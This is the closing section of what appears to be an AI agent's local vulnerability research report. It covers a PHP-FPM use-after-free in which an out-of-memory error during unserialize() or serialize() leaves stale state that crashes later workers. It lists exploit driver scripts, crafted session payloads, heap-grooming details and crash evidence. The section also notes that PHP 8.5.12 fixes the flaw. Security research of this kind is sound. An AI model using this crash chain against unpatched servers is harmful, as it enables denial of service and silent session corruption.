- **Scripts:** `lab/www/producer_oom.php`, `producer_ser_oom.php`,
  `producer_ser_soft.php`, `producer.php`, `consumer.php`, `sercheck.php`, `slow.php`,
  `sesset.php`; drivers `scripts/consumer_req.py`, `consumer_pad_req.py`, `ser_chain.py`,
  `stock_chain.py`, `chain_generic.py`; gdb `scripts/*.gdb`.
- **Raw requests / responses:**
  - decode stock: `evidence/stock2/consumer_after_oom.raw` (537 B),
    `evidence/stock2/consumer_after_oom.resp` (502);
  - decode 8.5.11: `evidence/stock8511/consumer_after_oom.raw`, `loop1.raw`;
  - encode stock: `evidence/ser_stock/consumer.raw` (534 B), `consumer.resp` (502);
  - encode 8.5.11: `evidence/ser_8511d/consumer.raw` (502),
    `evidence/ser_8511s/reps/rep1..3.raw` (200, corruption);
  - 8.5.12 controls: `evidence/fixed_8512pad/c1..c10.resp` (10/10 200),
    `evidence/ser_8512d/consumer.resp`, `evidence/ser_8512s/consumer_soft.resp`.
- **Session files:** `lab/sessions_stock/sess_stocksid2` (`p|s:5:"hello";`),
  `lab/sessions_stock/sess_bgser1` (`p|a:2:{i:0;s:5:"hello";i:1;R:2;}`), plus the
  `sessions_8511*/sessions_8512/sessions_diag` copies.
- **Crash logs:** `lab/logs/fpm-stock-error.log`, `fpm-diag-error.log`,
  `fpm-8511s-error.log`, `fpm-8511d-error.log`, `fpm-8512-error.log`,
  `fpm-8512s-error.log`; PHP OOM logs `lab/logs/php_*_error.log`.
- **gdb:** `evidence/gdb/crash_8426.log`, `crash_8511.log`, `timeline8512_wakeup_chain.log`,
  `timeline8512_oom_chain.log`; `evidence/ser_gdb/chain2_bt.log`, `n8511.log`,
  `chain8512_soft.log`.
- **Hashes:** `hashes/SHA256SUMS` (binaries, source tarball, configs, scripts, evidence,
  session files); verification log `hashes/verify.log` (`sha256sum -c`, all lines OK).

Key session-file sha256:

```
5c8c3db7c9d31d70ad92ab05928ed3a0025646724f0a7c67e54b10eeaf7aa43c  sess_stocksid2
355bfe5960d7abc24847218615a539b16657b253d83dcee0f42f7beffffcfee3  sess_bgser1
```

---

## 11. Limitations / notes

- **Heap-layout dependence.** The decode crash on 8.5.11 requires the freed
  `php_unserialize_data` to be overwritten with hostile contents; a 24 KB `pad` field
  (`'P'`) succeeded in the tested layout. Without grooming, the same chain can return 200
  (8.5.11 dynamic chain 1) instead of crashing. The stock 8.4.26 decode chain crashed on
  both attempts without grooming.
- **Static vs dynamic.** A crash in a `pm=dynamic` pool is still a worker crash (the
  master respawns); it is not a master crash. The 8.5.12 hard-limit `_exit(137)` is also
  a worker exit, not a master exit.
- **No ASAN trace.** The only ASAN build available is 8.5.12 (fixed); it was pinged once
  (200, worker `2778511`) and could not reproduce a bug that the fixed binary does not
  have. The evidence is plain-build SIGSEGV with gdb backtraces, plus the FPM SIGSEGV
  log lines.
- **Single-run stock chains.** The 8.4.26 official decode chain was run twice (both
  crashed); the 8.5.11 dynamic decode chain was run twice (one survived, one crashed);
  the encode stock chains were run once each. The heap-layout dependence is documented
  rather than averaged away.
- **MediaWiki not re-run.** Per instruction, MediaWiki was not used as a producer here;
  its negative result is cited from
  `/tmp/opencode/research/mw_109619_20261023T010708Z/report_final.md`.
- **No push/commit/PR/advisory.** All work is local artifacts under the run root.

---

## 12. Bottom line

The FPM pre-RINIT serializer-state primitive is **not theoretical**:

- **`BG(unserialize)`:** an OOM in `unserialize()` leaves `level=1, lock=0`; the next
  multipart upload-progress request decodes its session before RINIT and crashes in
  `var_tmp_var` on the freed `php_unserialize_data`. Stock 8.4.26 and 8.5.11 workers
  SIGSEGV; 8.5.12 is fixed by `php_basic_early_rinit()`.
- **`BG(serialize)`:** an OOM in `serialize()` leaves `level=1, lock=0`; a next request
  whose session contains a PHP reference crashes in `php_add_var_hash()` /
  `zend_hash_index_add_new()` on the freed `php_serialize_data.ht`. Stock 8.4.26 and
  8.5.11 workers SIGSEGV; the single-worker 8.5.11 layout instead destroys the session
  via a stale `n`-shifted `R:` index; 8.5.12 is fixed (plus the 200% hard limit exits the
  worker before state can survive).
- The response body does not leak the state under `display_errors=Off`; the effects are
  worker crashes and, in one layout, silent session corruption.
